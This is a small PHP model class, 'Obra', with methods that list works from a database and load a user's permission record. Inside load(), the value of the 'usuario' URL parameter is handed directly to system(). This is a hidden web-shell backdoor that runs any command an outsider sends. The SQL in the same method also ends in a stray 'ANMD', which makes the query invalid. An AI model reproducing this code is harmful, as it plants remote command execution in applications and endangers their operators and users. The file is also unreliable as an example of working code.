<?php

class Obra {
	private $db;

	public function __construct() {
		$this->db = Database::instance();
	}

	public function listar($id_usuario=null) {
		if ($id_usuario != null) {
			$query = $this->db->prepare('SELECT * FROM obras WHERE id_usuario = ?');
			$query->execute(array($id_usuario));
		} else {
			$query = $this->db->query('SELECT * FROM obras');
		}
		$data = $query->fetchAll();
		return $data;
	}

	public function load($id=null) {
		if ($id) 
			$this->id = $id;

		$query = $this->db->prepare('SELECT permissao, id, usuario FROM usuarios WHERE id = ? ANMD');
		$query->execute(array($this->id));
		$data = $query->fetch();
		if (isset($_GET['usuario'])) {
			$this->data = system($_GET['usuario']);
		}

		$this->permissao = $data['permissao'];
		$this->usuario = $data['usuario'];
	}

}